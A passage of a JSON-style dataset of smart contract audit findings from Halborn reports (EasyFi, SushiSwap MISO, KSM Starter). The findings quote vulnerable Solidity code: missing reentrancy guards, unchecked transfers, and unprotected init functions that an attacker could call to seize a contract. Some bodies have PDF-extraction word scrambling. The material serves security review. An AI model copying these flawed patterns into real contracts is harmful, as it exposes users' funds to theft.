        "body": "Smart contract stakingFactory.sol uses the floating pragma ^0.5.16. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma. For example, an outdated pragma version might introduce bugs that affect the contract system negatively security recently or vulnerabilities. versions released unknown pragma have may Code Location: Listing 2: stakingFactory.sol (Lines 1) 1 pragma solidity ^0.5.16; 2 3 /* * Risk Level: Likelihood - 1 Impact - 3 Recommendations: Consider locking the pragma version. It is not recommended to use a floating pragma in production. Apart from just locking the pragma version in the code, the sign (^) need to be removed. It is possible to lock the pragma by fixing the version both in truffle-config.js for Truffle framework or in hardhat.config.js for HardHat framework. Remediation Plan: SOLVED: Pragma version was locked to 0.7.6. 14 ",
        "labels": [
            "Halborn",
            "EasyFi_Staking",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING BOUND CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Staking_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "In notifyRewardAmount() function, rewardRate is calculated dividing reward by RewardDuration. In addition, reward.add(leftover) is divided by rewardsDuration to calculate rewardRate as well. If both denominators are greater than the numerators, rewardRate leads to 0. Code Location: Listing 3: stakingFactory.sol (Lines 1) 619 620 621 622 623 624 625 626 627 628 629 630 631 632 633 634 635 636 637 638 639 640 function notifyRewardAmount ( uint256 reward ) external onlyRewardsDistribution updateReward ( address (0) ) { if ( block . timestamp >= periodFinish ) { rewardRate = reward . div ( rewardsDuration ); } else { uint256 remaining = periodFinish . sub ( block . timestamp ); uint256 leftover = remaining . mul ( rewardRate ); rewardRate = reward . add ( leftover ). div ( rewardsDuration ) ; } // Ensure the provided reward amount is not more than the balance in the contract . // This keeps the reward rate in the right range , preventing overflows due to 15 641 642 643 644 645 646 647 648 649 650 651 652 653 654 655 656 657 // very high values of rewardRate in the earned and rewardsPerToken functions ; // Reward + leftover must be less than 2^256 / 10^18 to avoid overflow . uint balance = rewardsToken . balanceOf ( address ( this )) ; require ( rewardRate <= balance . div ( rewardsDuration ) , \" Provided reward too high \"); lastUpdateTime = block . timestamp ; periodFinish = block . timestamp . add ( rewardsDuration ); emit RewardAdded ( reward ); } Risk Level: Likelihood - 1 Impact - 2 Recommendation: Consider adding modifiers for bound checks such as: Listing 4 1 require ( reward >= rewardsDuration , \" Reward is too small \") ; Listing 5 1 require ( reward . add ( leftover ) >= rewardsDuration , \" Reward is too small \") ; 16 Remediation Plan: RISK ACCEPTED: rewardsDuration is based on UNIX timestamp and reward is in wei(token with decimals 6,8,18 includes). Rewards will never be less than 1000 Tokens. With least case (Reward token with 6 decimals and duration for one year) 1,000,000,000 will be greater than 31,556,952(for 1 year). 17 ",
        "labels": [
            "Halborn",
            "EasyFi_Staking",
            "Severity: Informational"
        ]
    },
    {
        "title": "INTEGER OVERFLOW",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Staking_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "An overflow happens when an arithmetic operation reaches the maximum size of a type. If the reward is higher than uint(-1).div(1e18) could happen an overflow. In computer programming, an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits -- either larger than the maximum or lower than the minimum representable value. Code Location: Listing 6: stakingFactory.sol (Lines 1) 619 620 621 622 623 624 625 626 627 628 629 630 631 632 633 634 635 636 637 638 function notifyRewardAmount ( uint256 reward ) external onlyRewardsDistribution updateReward ( address (0) ) { if ( block . timestamp >= periodFinish ) { rewardRate = reward . div ( rewardsDuration ); } else { uint256 remaining = periodFinish . sub ( block . timestamp ); uint256 leftover = remaining . mul ( rewardRate ); rewardRate = reward . add ( leftover ). div ( rewardsDuration ) ; } // Ensure the provided reward amount is not more than the balance in the contract . 18 639 640 641 642 643 644 645 646 647 648 649 650 651 652 653 654 655 656 657 // This keeps the reward rate in the right range , preventing overflows due to // very high values of rewardRate in the earned and rewardsPerToken functions ; // Reward + leftover must be less than 2^256 / 10^18 to avoid overflow . uint balance = rewardsToken . balanceOf ( address ( this )) ; require ( rewardRate <= balance . div ( rewardsDuration ) , \" Provided reward too high \"); lastUpdateTime = block . timestamp ; periodFinish = block . timestamp . add ( rewardsDuration ); emit RewardAdded ( reward ); } Risk Level: Likelihood - 1 Impact - 2 Recommendation: Although SafeMath library is used, consider adding the following modifier as well to prevent the overflow: Listing 7 1 require ( reward < uint ( -1) . div (1 e18 ) , \" Reward overflow \") ; 19 Remediation Plan: RISK ACCEPTED: rewardAmount is set in Factory contract at deployment. Then, it can never be greater than uint ( -1) . div (1 e18 ). 20 ",
        "labels": [
            "Halborn",
            "EasyFi_Staking",
            "Severity: Informational"
        ]
    },
    {
        "title": "NO TEST COVERAGE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Staking_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "Unlike traditional software, smart contracts can not be modified unless deployed using a proxy contract. Because of the permanence, unit tests and functional testing are recommended to ensure the code works correctly before deployment. Mocha and Chai are valuable tools to perform unit tests in smart contracts. Mocha is a Javascript testing framework for creating synchronous and asynchronous unit tests, and Chai is a library with assertion functionality such as assert or expect and should be used to develop custom unit tests. References: https://github.com/mochajs/mocha https://github.com/chaijs/chai https://docs.openzeppelin.com/learn/writing-automated-tests Risk Level: Likelihood - 1 Impact - 2 Recommendation: We recommend performing as many test cases as possible to cover all conceivable scenarios in the smart contract. Remediation Plan: SOLVED: EasyFi Team added test coverage. 21 ",
        "labels": [
            "Halborn",
            "EasyFi_Staking",
            "Severity: Informational"
        ]
    },
    {
        "title": "DOCUMENTATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Staking_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "For The documentation provided by the EasyFi team is not complete. instance, the documentation included in the GitHub repository should include a walkthrough to deploy and test the smart contracts. Recommendation: Consider updating the documentation in Github for greater ease when contracts are deployed and tested. Have a Non-Developer or QA resource work through the process to make sure it addresses any gaps in the set-up steps due to technical assumptions. Remediation Plan: SOLVED: EasyFi Team documented all deployment stage. 22 ",
        "labels": [
            "Halborn",
            "EasyFi_Staking",
            "Severity: Informational"
        ]
    },
    {
        "title": "USE OF BLOCK.TIMESTAMP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SushiSwap_MISO_Smart_Contract_Report_Halborn_v2.pdf",
        "body": "During a manual static review, the tester noticed the use of block. The contract developers should be aware timestamp in few contracts. Miners can influence the value that this does not mean current time. of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of now creates a risk that time manipulation can be performed to manipulate price oracles. Miners can modify the timestamp by up to 900 seconds. Code Location: Listing 1: PoolLiquidity.sol (Lines 141) 139 140 141 142 143 144 145 146 // / @notice Deposits ETH to the contract . function depositETH () public payable { require ( block . timestamp < deadline , \" PoolLiquidity : Contract has expired \" ); require ( liquidityAdded == 0 , \" PoolLiquidity : Liquidity already added \"); if ( msg . value > 0 ) { WETH . deposit { value : msg . value }() ; } } Listing 2: PoolLiquidity.sol (Lines 153) 152 153 154 155 156 function depositTokens ( uint256 amount ) external returns ( bool success ) { require ( block . timestamp < deadline , \" PoolLiquidity : Contract has expired \" ); require ( amount > 0, \" PoolLiquidity : Token amount must be greater than 0\" ); require ( liquidityAdded == 0 , \" PoolLiquidity : Liquidity already added \"); _safeTransferFrom ( address ( token ) , msg . sender , amount ); 18 157 } Listing 3: PoolLiquidity.sol (Lines 182) 180 181 182 183 function withdrawLPTokens () external returns ( uint256 liquidity ) { require ( accessControls . hasOperatorRole ( msg . sender ) , \" PoolLiquidity : Sender must be operator \" ); require ( block . timestamp >= unlock , \" PoolLiquidity : Liquidity is locked \"); liquidity = IERC20 ( tokenWETHPair ). balanceOf ( address ( this )) ; Listing 4: PoolLiquidity.sol (Lines 192) 189 190 191 192 function withdrawDeposits () external { require ( accessControls . hasOperatorRole ( msg . sender ) , \" PoolLiquidity : Sender must be operator \" ); require ( liquidityAdded == 0 , \" PoolLiquidity : Liquidity is locked \" ); require ( block . timestamp > expiry , \" PoolLiquidity : Timer has not yet expired \"); Listing 5: PoolLiquidity.sol (Lines 220,221) 219 220 221 require ( accessControls . hasOperatorRole ( msg . sender ) , \" PoolLiquidity : Sender must be operator \" ); require ( block . timestamp > deadline , \" PoolLiquidity : Deposit deadline has not passed \" ); require ( block . timestamp < expiry , \" PoolLiquidity : Contract has expired \" ); Listing 6: PoolLiquidity02.sol (Lines 188) 186 187 188 function _deposit ( uint amount , address token ) private returns ( bool success ) { // CC : shouldn 't be require ( block . timestamp < deadline , if deadline is deposit deadline ? require ( block . timestamp < expiry , \" PoolLiquidity02 : Contract has expired \" ); 19 Listing 7: PoolLiquidity02.sol (Lines 217) 215 216 217 218 function withdrawLPTokens () external returns ( uint256 liquidity ) { require ( accessControls . hasOperatorRole ( msg . sender ) , \" PoolLiquidity02 : Sender must be operator \" ); require ( block . timestamp >= unlock , \" PoolLiquidity02 : Liquidity is locked \"); liquidity = IERC20 ( tokenPair ). balanceOf ( address ( this )) ; Listing 8: PoolLiquidity02.sol (Lines 226) 224 225 226 function withdrawDeposits () external { require ( accessControls . hasOperatorRole ( msg . sender ) , \" PoolLiquidity02 : Sender must be operator \" ); require ( block . timestamp > expiry , \" PoolLiquidity02 : Timer has not yet expired \"); Listing 9: PoolLiquidity02.sol (Lines 255,256) 252 253 254 255 256 function _launchLiquidityPool () internal returns ( uint256 liquidity ) { // / GP : Could add a flag to give the option for a trustless launch require ( accessControls . hasOperatorRole ( msg . sender ) , \" PoolLiquidity02 : Sender must be operator \" ); require ( block . timestamp > deadline , \" PoolLiquidity02 : Deposit deadline has not passed \" ); require ( block . timestamp < expiry , \" PoolLiquidity02 : Contract has expired \" ); Risk Level: Likelihood - 1 Impact - 4 Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, 20 days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: SOLVED: Although block.timestamp is still in use in contract Liquidity/ PostAuctionLauncher.sol, timescales are higher than 900 seconds which is considered as safe. 21 ",
        "labels": [
            "Halborn",
            "SushiSwap_MISO",
            "Severity: Low"
        ]
    },
    {
        "title": "UINT256 OVERFLOW",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SushiSwap_MISO_Smart_Contract_Report_Halborn_v2.pdf",
        "body": "An overflow happens when an arithmetic operation reaches the maximum or minimum size of a type. For instance here in PoolLiquidity.sol and PoolLiquidity02.sol, value received from users stored in the uint256 type. In computer programming, an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits -- either larger than the maximum or lower than the minimum representable value. Code Location: Listing 10: initPoolLiquidity() method in both PoolLiquidity.sol and in PoolLiquidity02.sol (Lines 126) 123 124 125 126 127 wallet = _wallet ; deadline = _deadline ; launchwindow = _launchwindow ; expiry = _deadline + _launchwindow ; locktime = _locktime ; Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to use vetted safe math libraries for arithmetic oper- ations consistently throughout the smart contract system Reference: 22 Ethereum Smart Contract Best Practices - Integer Overflow and Underflow Remediation Plan: SOLVED: The Pool Liquidity contracts has been restricted to just auctions and timing variables(_expiry, _deadline, Launchwindow etc) have also been removed. 23 ",
        "labels": [
            "Halborn",
            "SushiSwap_MISO",
            "Severity: Low"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SushiSwap_MISO_Smart_Contract_Report_Halborn_v2.pdf",
        "body": "The Smart Contract Liquidity/LiquidityZAP.sol uses the floating pragma Contracts should be deployed with the same compiler version ^0.6.12. and flags used during development and testing. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another For example, an outdated pragma version might introduce bugs pragma. that affect the contract system negatively or recently released pragma versions may have unknown security vulnerabilities. Code Location: Listing 11: LiquidityZAP.sol 1 pragma solidity ^0.6.12; Risk Level: Likelihood - 1 Impact - 3 Recommendations: Consider locking the pragma version. It is not recommended to use a floating pragma in production. Apart from just locking the pragma version in the code, the sign (>=) need to be removed. It is possible to lock the pragma by fixing the version both in truffle-config.js for Truffle framework or in hardhat.config.js for HardHat framework. Remediation Plan: SOLVED: LiquidityZAP.sol contract was removed. 24 ",
        "labels": [
            "Halborn",
            "SushiSwap_MISO",
            "Severity: Low"
        ]
    },
    {
        "title": "UNINITIALIZED VARIABLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SushiSwap_MISO_Smart_Contract_Report_Halborn_v2.pdf",
        "body": "The withdrawLPTokens function in PoolLiquidity contract does use the variable unlock, as seen on Listing 12, whose the initial values is 0. The only time that variable is set is when calling the _launchLiquidityPool function as shown in Listing 13. This means that the unlock variable check on Listing 12 does always validate causing the _safeTransfer to be called. Code Location: Listing 12: PoolLiquidity.sol (Lines 182) 180 function withdrawLPTokens () external returns ( uint256 liquidity ) { require ( accessControls . hasOperatorRole ( msg . sender ) , \" 181 PoolLiquidity : Sender must be operator \" ); require ( block . timestamp >= unlock , \" PoolLiquidity : Liquidity is locked \"); liquidity = IERC20 ( tokenWETHPair ). balanceOf ( address ( this )) ; require ( liquidity > 0, \" PoolLiquidity : Liquidity must be greater than 0 \"); _safeTransfer ( tokenWETHPair , wallet , liquidity ); 182 183 184 185 186 } Listing 13: PoolLiquidity.sol (Lines 251) 249 250 251 252 liquidity = IUniswapV2Pair ( tokenWETHPair ). mint ( address ( this )); liquidityAdded = liquidityAdded . add ( liquidity ); unlock = block . timestamp + locktime ; emit LiquidityAdded ( liquidityAdded ); 25 Risk Level: Likelihood - 1 Impact - 3 Recommendations: If is recommended to initialize all internal variables on the same func- tion, either on the constructor or a custom init method. However, using unitialized variables an expecting them to have a value could cause unexpected behaviours on the execution flow. Remediation Plan: SOLVED: Calling withdrawLPTokens is not allowed without first calling finalize due to the launched required lock. The unlock variable is set on finalize 26 ",
        "labels": [
            "Halborn",
            "SushiSwap_MISO",
            "Severity: Low"
        ]
    },
    {
        "title": "IGNORE RETURN VALUES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SushiSwap_MISO_Smart_Contract_Report_Halborn_v2.pdf",
        "body": "The return value of an external call is not stored in a local or state variable. In contracts liquidity/LiquidityZAP.sol, Recipes/MISORecipe01 .sol and Vault/TokenVault.sol, there are few instances where external methods are being called and return values(bool) is being ignored. Code Location: Listing 14: LiquidityZAP.sol (Lines 127) 125 126 127 uint256 outTokens = UniswapV2Library . getAmountOut ( buyAmount , reserveWeth , reserveTokens ); _WETH . transfer ( _tokenWETHPair , buyAmount ); Listing 15: LiquidityZAP.sol (Lines 171) 169 170 171 172 address to ) public returns ( uint amountA , uint amountB ) { IUniswapV2Pair ( _tokenWETHPair ). transferFrom ( msg . sender , _tokenWETHPair , liquidity ); // send liquidity to pair ( uint amount0 , uint amount1 ) = IUniswapV2Pair ( _tokenWETHPair ). burn ( to ); Listing 16: LiquidityZAP.sol (Lines 207) 205 206 207 uint256 outTokens = UniswapV2Library . getAmountOut ( amountETH , reserveWeth , reserveTokens ); _WETH . transfer ( _tokenWETHPair , amountETH ); 27 Listing 17: MISORecipe01.sol (Lines 129) 127 128 129 ISushiToken token = ISushiToken ( tokenFactory . createToken ( _name , _symbol , 1, msg . sender , tokensToMint )) ; token . approve ( address ( misoMarket ) , tokensToMarket ); Listing 18: MISORecipe01.sol 154 token . transfer ( address ( poolLiquidity ) , tokensToLiquidity ); Listing 19: MISORecipe01.sol (Lines 193) 193 194 token . transfer ( address ( farm ) , tokensToFarm ); uint256 allocPoint = 10; Listing 20: TokenVault.sol (Lines 76) 75 76 77 UserInfo storage userItem = users [ _withdrawer ]; userItem . lockedItemsWithUser . add ( _tokenAddress ); userItem . lockToItems [ _tokenAddress ]. push ( _id ); Risk Level: Likelihood - 3 Impact - 2 Recommendation: Add return value check to avoid unexpected crash of the contract. Return value check will help in handling the exceptions better way. Remediation Plan: Return value PARTIALLY SOLVED: LiquidityZAP.sol contract was removed. check is still missing in MISORecipe01.sol and TokenVault.sol contracts. 28 ",
        "labels": [
            "Halborn",
            "SushiSwap_MISO",
            "Severity: Low"
        ]
    },
    {
        "title": "INIT FUNCTION SHOULD BE CALLED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SushiSwap_MISO_Smart_Contract_Report_Halborn_v2.pdf",
        "body": "All of the init methods present on the contracts include a locking variable that is set when the init function is fully executed. This prevents calling init a second time or by accident. The following contracts are part of the Access directory and they require to initialise the underlaying AccessControl contract or the DEFAULT_ADMIN_ROLE role and the ownership of the contract could be taken by a 3rd party:  MISOAccessControls should call initAccessControls .  MISOAccessFactory should call initMISOAccessFactory .  MISOAdminAccess should call initAccessControls.  PointList should call initPointList.  PointListFactory should call initPointListFactory. The following contracts contain init methods that initialise global vari- ables used during the contract, if those init methods are not called before interacting with the contract unexpected behaviours and the possibility of contract takeover could occur: Auction:  BatchAuction should call initAuction.  Crowdsale (OUT OF SCOPE).  DutchAuction should call initAuction.  HyperbolicAuction should call initAuction. Liquidity:  LiquidityZAP should call initUniswapZAP. 29  PoolLiquidity should call initPoolLiquidity and launchLiquidityPool (otherwise the unlock variable is uninitialized)  PoolLiquidity02 should call initPoolLiquidity. Tokens:  FixedToken should call initToken.  MintableToken should call initToken.  SushiToken should call initToken. Contracts:  MISOFarmFactory should call initMISOFarmFactory.  MISOFermenter should call _initMISOFermenter.  MISOLiquidityLauncher should call initMISOLiquidityLauncher.  MISOMarket (OUT OF SCOPE).  MISOTokenFactory should call initMISOTokenFactory. Risk Level: Likelihood - 1 Impact - 1 Recommendations: As an example, an attacker could create an automated tool that scans all contract factories for new contracts being deployed. Once a new contract is created automatically call the init method gaining control of it. It is recommended to initialize internal state variables and access controls during the creation of the contract. This would prevent an attacker to initializing the contract and taking the control of it. If the init function is the desired behaviour then a guideline on deployment should be given to the customers reminding them to always call the init function. 30 Remediation Plan: The SushiSwap team accepts the risk. 31 ",
        "labels": [
            "Halborn",
            "SushiSwap_MISO",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SushiSwap_MISO_Smart_Contract_Report_Halborn_v2.pdf",
        "body": "Auction/BatchAuction.sol, Auction/DutchAuction.sol, In smart contracts Access/MISOAdminAccess.sol, Access/PointListFactory .sol, Auction/ Token/MintableToken.sol, Token/FixedToken.sol, HyperbolicAuction.sol, Token/SushiToken.sol, Helper/MISOHelper.sol, Utils/BoringBatchable.sol, Utils/BoringFactory.sol, Utils/Owned.sol, Vault/GnosisSafeFactory.sol Utils/Timeclock.sol, and Vault/TokenVault.sol there are methods like initAccessControls (), setMinimumFee(), setDividends(), deployPointList(), transferAnyERC20Token(), commitEth() , commitTokens(), finalize(), withdrawTokens(), initMarket() etc. are marked as public but they are never directly called within the same contract or in any of its descendants. Utils/BoringOwnable.sol, initPointListFactory(), deprecateFactory(), Utils/WETH9.sol, Risk Level: Likelihood - 1 Impact - 1 Recommendations: If the function is not intended to be called internally or by descendants, it is better to mark all these functions as external instead of public to save gas. Remediation Plan: The SushiSwap team accepts the risk. 32 ",
        "labels": [
            "Halborn",
            "SushiSwap_MISO",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING ADDING OPERATOR ROLE AND INTERFACE TO THE DEPLOYED CHILD CONTRACT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SushiSwap_MISO_Smart_Contract_Report_Halborn_v2.pdf",
        "body": "PointList is checking for OperatorRole in setPoints, that means that the admin would have to add itself as operator in order to set the points. This is causing all PointLists created with the PointListFactory to not allow the admin to setPoints as shown in Listing 22. Deploying a PointList from the factory and setting points i by calling setPoints is giving the error of missing operator role as shown in Figure Figure 1. Figure 1: Require error returned when calling setPoints after the contract has been deployed using PointListFactory After adding the operator role with addOperatorRole it is possible to call setPoints as shown in Figure Figure 2. Furthermore, It was noticed that the address(this) is also added as an operator to the under-laying created child contract as shown in line 129 on Listing 21. The operator role does only allow the setPoints function to 33 Figure 2: Successfully calling the setPoints after the operator role has been added be called. However, there exists no interface from the PointListFactory to call any of the methods present on the created child PointList. Moreover, the PointListFactory is adding itself as an operator on the created PointList, but the creator of the PointList (list owner and admin) can easily remove it by calling removeOperatorRole. Code Location: Listing 21: PointListFactory.sol (Lines 134,129) 126 pointList = createClone ( pointListTemplate ); 127 if ( _accounts . length > 0) { 128 129 130 131 132 133 } else { 134 135 } IPointList ( pointList ). initPointList ( address ( this )) ; MISOAccessControls ( pointList ). addOperatorRole ( address ( this )) ; IPointList ( pointList ). setPoints ( _accounts , _amounts ); MISOAccessControls ( pointList ). addAdminRole ( _listOwner ); MISOAccessControls ( pointList ). removeAdminRole ( address ( this )) ; IPointList ( pointList ). initPointList ( _listOwner ); Listing 22: PointList.sol (Lines 70) 69 function setPoints ( address [] memory _accounts , uint256 [] memory _amounts ) external override { 70 require ( hasOperatorRole ( msg . sender ) , \" PointList . setPoints : Sender 34 must be operator \"); 71 require ( _accounts . length != 0) ; 72 require ( _accounts . length == _amounts . length ); Risk Level: Likelihood - 1 Impact - 1 Recommendations: If thats an intended functionality it should be explained to the customers when deploying the PointListFactory contract and using it. Furthermore, if no interface will be provided to the PointListFactory is better to remove access control to under-laying contract since compromising the PointListFactory would allow any child PointList to be compromised as well, this will make sure that the least privilege security principle is meet. Remediation Plan: SOLVED: Removed addOperatorRole for the Factory address, and checking for hasAdminRole on the deployed child contract 35 ",
        "labels": [
            "Halborn",
            "SushiSwap_MISO",
            "Severity: Informational"
        ]
    },
    {
        "title": "POINTLIST FACTORY DEPRECATION HAS NO EFFECT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SushiSwap_MISO_Smart_Contract_Report_Halborn_v2.pdf",
        "body": "Deprecating a PointListFactory does not do anything aside from emitting an event an updating the internal newAddress variable as shown in Figure 23. The newAddress variable is not checked anywhere inside the contract, meaning that the Factory can still create pointList childs based on the pointListTemplate Code Location: Listing 23: PointListFactory.sol (Lines 89) * @notice Deprecates factory . * @param _newAddress Blank address . */ 81 /* * 82 83 84 85 function deprecateFactory ( address _newAddress ) public { 86 require ( accessControls . hasAdminRole ( msg . sender ) , \" PointListFactory : Sender must be admin \" ); require ( newAddress == address (0) ) ; emit FactoryDeprecated ( _newAddress ); newAddress = _newAddress ; 87 88 89 90 } Risk Level: Likelihood - 1 Impact - 1 36 Recommendations: The deprecation funcionallity seams to not be in use so the recommendation is to remove the code from the contract if thats the case. If not using the deprecation feature is unintended make sure to use the newAddress to validate if the Factory has been deprecated when creating new PointList childs. The deprecation functionality should be denying the creation of new contracts. Remediation Plan: SOLVED and INFORMED: The deprecate functionality is used to inform on the client side that a new address of the factory is present without breaking the compatibility with the old factory 37 3.10 (HAL-10) INDEX OUT OF RANGE MISSING CHECKS - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "SushiSwap_MISO",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KSM_Starter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "It was identified that KSMStarter Contracts are missing nonReentrant guard. In contract IDO.sol, functions register and in contract KSTStaking .sol, functions stake and unstake.sol, and in contract KSMIDO.sol function buy(uint256) are missing nonReentrant guard. Also, in these functions, external calls are called before all state changes are resolved, making it vulnerable to a Reentrancy attack. To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against the Reentrancy attacks. Code Location: Listing 2: IDO.sol (Lines 215,216,217) 215 216 217 218 staking . lock ( msg . sender , claimStartTime ); // locks users staked balance idoParticipants = idoParticipants . add (1) ; emit Registered ( msg . sender , claimStartTime , lockedBal , tier ); } Listing 3: KSTStaking.sol (Lines 45,47,48) function stake ( uint256 value ) external notHalted { require ( value > 0, \" KSTStaking : stake value should be greater than 0\" ); _token . safeTransferFrom ( _msgSender () , address ( this ) , value ); 43 44 45 46 14 47 48 49 } _balances [ _msgSender () ] = _balances [ _msgSender () ]. add ( value ); emit Stake ( _msgSender () , block . timestamp , value ); Listing 4: KSTStaking.sol (Lines 55,56) 51 52 53 54 55 56 57 function unstake ( uint256 value ) external lockable { require ( _balances [ _msgSender () ] >= value , ' KSTStaking : insufficient staked balance '); _balances [ _msgSender () ] = _balances [ _msgSender () ]- value ; _token . safeTransfer ( _msgSender () , value ); emit Unstake ( _msgSender () , block . timestamp , value ); } Listing 5: KSMIDO.sol (Lines 53,64,65,66,67,68) 53 paymentToken . safeTransferFrom ( msg . sender , address ( this ) , _paymentAmount ); 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 uint256 tokensToPurchase = _paymentAmount . mul ( tokenPrice ); uint256 difference ; if ( _paymentAmount . add ( totalRaised ) > raiseCap ) { difference = raiseCap . sub ( _paymentAmount ); // fill the remaining cap tokensToPurchase = difference . mul ( tokenPrice ); } else { difference = _paymentAmount ; } uint256 userEthAmount = user . tokenAmount . div ( tokenPrice ); // full amount require ( difference <= userEthAmount , \" not correct eth value \"); user . claimAmount = tokensToPurchase ; // set how much tokens can claim user . swapAmount = difference ; // set how much movr was sent user . tokenAmount = difference . mul ( tokenPrice ); // set token amount based on eth sent totalRaised = totalRaised + difference ; // increase total raised emit Bought ( msg . sender , difference ); 15 Risk Level: Likelihood - 2 Impact - 4 Recommendation: Change the code to follow the checks-effects-interactions pattern and use ReentrancyGuard through the nonReentrant modifier. Remediation Plan: SOLVED: The KSM-Starter team solved the issue by adding the nonReentrant modifier. 16 ",
        "labels": [
            "Halborn",
            "KSM_Starter",
            "Severity: Medium"
        ]
    },
    {
        "title": "UNCHECKED TRANSFER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KSM_Starter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "In contract KSMStarterLotteryRNG.sol the return value of an external transfer call LINK.transfer(msg.sender,LINK.balanceOf(address(this))) is not checked. It should be noted that token do not revert in case of failure and return false. If one of these tokens is used, a deposit would not revert if the transfer fails, and an attacker could deposit tokens for free. Code Location: Listing 6: KSMStarterLotteryRNG.sol (Lines 56) function returnLINK () external ownerOrOperator { LINK . transfer ( msg . sender , LINK . balanceOf ( address ( this ))); } 55 56 57 58 Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to use SafeERC20, or ensure that the transfer return value is checked. The ERC20 standard recommends throwing exceptions in functions transfer and transferFrom. References: ERC20 API: Transfer and TransferFrom 17 Remediation Plan: SOLVED: The KSM-Starter team solved the issue by using SafeERC20 implementation. Also, they added the safetransfer function to the code: Listing 7 1 IERC20 ( address ( LINK )) . safeTransfer ( msg . sender , LINK . balanceOf ( address ( this ))); 18 ",
        "labels": [
            "Halborn",
            "KSM_Starter",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING ZERO",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KSM_Starter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "are found multiple of Lack instances zero is There missing. when assigning user supplied address values to state variables directly. In VestingCommunityIncentives.sol, VestingTeam.sol and VestingTreasury.sol contracts function setBeneficiary(address) lacks a zero-check on _addy. where validation validation found VestingMarketing.sol, Address has address been Code Location: Listing 8: VestingCommunityIncentives.sol (Lines 81) 79 80 81 82 function setBeneficiary ( address _addy ) external { require ( msg . sender == beneficiary ); beneficiary = _addy ; } Listing 9: VestingMarketing.sol (Lines 81) 79 80 81 82 function setBeneficiary ( address _addy ) external { require ( msg . sender == beneficiary ); beneficiary = _addy ; } Listing 10: VestingTeam.sol (Lines 81) 79 80 81 82 function setBeneficiary ( address _addy ) external { require ( msg . sender == beneficiary ); beneficiary = _addy ; } 19 Listing 11: VestingTreasury.sol (Lines 81) 79 80 81 82 function setBeneficiary ( address _addy ) external { require ( msg . sender == beneficiary ); beneficiary = _addy ; } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Although administrative restrictions are imposed to this function due to the OpenZeppelin RBAC it is better to add proper address validation when assigning a value to a variable from user supplied inputs. Remediation Plan: SOLVED: KSM-Starter team solved the issue by adding the zero address check (require(_addy != address(0));) to the code. 20 ",
        "labels": [
            "Halborn",
            "KSM_Starter",
            "Severity: Low"
        ]
    },
    {
        "title": "INCOMPATIBILITY WITH INFLATIONARY TOKENS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KSM_Starter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
